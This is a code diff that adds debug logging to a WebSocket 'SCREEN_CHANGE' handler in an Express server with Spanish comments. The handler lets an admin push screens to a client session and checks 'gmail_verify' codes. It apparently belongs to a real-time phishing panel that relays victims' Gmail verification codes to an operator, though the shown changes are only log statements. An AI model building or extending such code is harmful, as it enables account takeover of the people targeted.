@@ -1225,6 +1225,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Handle screen change request from admin
         if (parsedMessage.type === 'SCREEN_CHANGE') {
           try {
+            console.log('[WebSocket] Procesando SCREEN_CHANGE:', JSON.stringify(parsedMessage.data));
+            
             // Verificamos si es el tipo gmail_verify para tener especial cuidado con el código
             if (parsedMessage.data.tipo && parsedMessage.data.tipo.includes('gmail_verify')) {
               console.log('⚠️ [WebSocket] Procesando comando GMAIL_VERIFY con datos:', JSON.stringify(parsedMessage.data));
@@ -1237,6 +1239,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Validate the data
             const validatedData = screenChangeSchema.parse(parsedMessage.data);
             const { sessionId, tipo } = validatedData;
+            console.log('[WebSocket] Datos validados - sessionId:', sessionId, 'tipo:', tipo);
 
             // Si es gmail_verify, confirmamos que el código sea el mismo que se recibió
             if (tipo.includes('gmail_verify')) {
@@ -1245,10 +1248,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
             // Normalize the tipo by removing "mostrar_" prefix if present
             let normalizedTipo = tipo.replace('mostrar_', '');
+            console.log('[WebSocket] Tipo normalizado:', normalizedTipo);
 
             // Find the target client
             const client = clients.get(sessionId);
+            console.log('[WebSocket] Cliente encontrado:', client ? 'SÍ' : 'NO', 'readyState:', client?.readyState);
+            
             if (client && client.readyState === WebSocket.OPEN) {
+              console.log('[WebSocket] Enviando SCREEN_CHANGE al cliente');
               // Send the screen change command to the client with normalized tipo
               const clientData = { ...validatedData, tipo: normalizedTipo };
               client.send(JSON.stringify({
@@ -1293,9 +1300,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 type: 'SESSION_UPDATE',
                 data: updatedSession
               }), createdBy); // Dirigimos el mensaje al creador de la sesión
+              
+              console.log('[WebSocket] SCREEN_CHANGE procesado exitosamente');
+            } else {
+              console.log('[WebSocket] ⚠️ Cliente no conectado o no listo. No se puede enviar pantalla.');
+              console.log('[WebSocket] Total de clientes conectados:', clients.size);
+              console.log('[WebSocket] IDs de clientes conectados:', Array.from(clients.keys()));
             }
           } catch (error) {
-            console.error("Invalid screen change data:", error);
+            console.error("[WebSocket] Error en SCREEN_CHANGE:", error);
             ws.send(JSON.stringify({ 
               type: 'ERROR', 
               message: "Invalid screen change data" 
